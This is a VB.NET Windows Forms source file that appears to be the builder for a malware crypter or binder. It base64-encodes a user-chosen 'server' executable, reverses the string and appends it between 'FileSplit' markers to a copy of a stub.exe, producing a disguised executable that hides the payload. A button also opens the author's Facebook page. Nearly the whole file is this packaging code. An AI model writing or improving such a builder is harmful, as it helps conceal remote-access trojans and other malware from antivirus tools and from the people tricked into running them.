﻿Imports System.IO

Public Class Form1

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Dim theStub As String = CurDir() & "\stub.exe"
        If IO.File.Exists(theStub) = False Then
            MsgBox("No Stub Found", MsgBoxStyle.Exclamation)
            Exit Sub
        End If
        Dim save As New SaveFileDialog
        save.Filter = ".exe file |*.exe"
        If save.ShowDialog = Windows.Forms.DialogResult.OK Then
            Dim savepath As String = save.FileName
            IO.File.Copy(theStub, savepath)
            IO.File.AppendAllText(savepath, "FileSplit" & StrReverse(RichTextBox1.Text) & "FileSplit")
            MsgBox("Done", MsgBoxStyle.Information, "Done")
        Else
            MsgBox("Error in saving file", MsgBoxStyle.Critical, "Error")
            Exit Sub
        End If
      
    End Sub



  Public Function ConvertFileToBase64(ByVal fileName As String) As String
        Return Convert.ToBase64String(System.IO.File.ReadAllBytes(fileName))
    End Function





    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim open As New OpenFileDialog
        open.Title = "Choose server"
        open.Filter = ".exe file | *.exe"
        If open.ShowDialog = DialogResult.OK Then
            TextBox1.Text = open.FileName
        Else
            MsgBox("Error in choosing file", MsgBoxStyle.Critical, "Error")
            Exit Sub
        End If
        RichTextBox1.Text = (ConvertFileToBase64(TextBox1.Text))
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Process.Start("https://www.facebook.com/abood.AZZ")
        About.Show()
    End Sub
End Class
